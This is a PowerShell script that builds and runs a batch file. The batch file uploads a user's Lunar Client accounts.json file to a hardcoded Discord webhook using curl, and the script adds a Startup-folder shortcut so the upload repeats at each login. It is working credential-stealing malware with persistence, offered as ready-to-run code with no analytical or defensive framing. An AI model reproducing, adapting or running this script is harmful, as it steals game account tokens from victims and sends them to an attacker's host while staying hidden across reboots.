# Create batch file on Desktop
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'

$batchContent = @"
@echo off
setlocal enabledelayedexpansion

set webhookUrl=https://discord.com/api/webhooks/1397474070445949018/uSDXi6msvoejMYu5X-3FxGV1SqD-G77qcjMRYgmZV-D5iJ-6QnDplsl22CPWKyoJJHV0
set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json

if not exist "%filePath%" (
    exit /b
)

set message=Here you go king :pray:
set payload_json={\"content\":\"%message%\"}

curl -X POST %webhookUrl% ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=%payload_json%" ^
     -F "file=@%filePath%"

endlocal
"@

Set-Content -Path $batchFilePath -Value $batchContent

# Run it now
Start-Process -FilePath $batchFilePath

# Add to Startup
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = Join-Path $startupPath 'send_webhook.lnk'

$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $batchFilePath
$shortcut.WorkingDirectory = $desktopPath
$shortcut.Save()
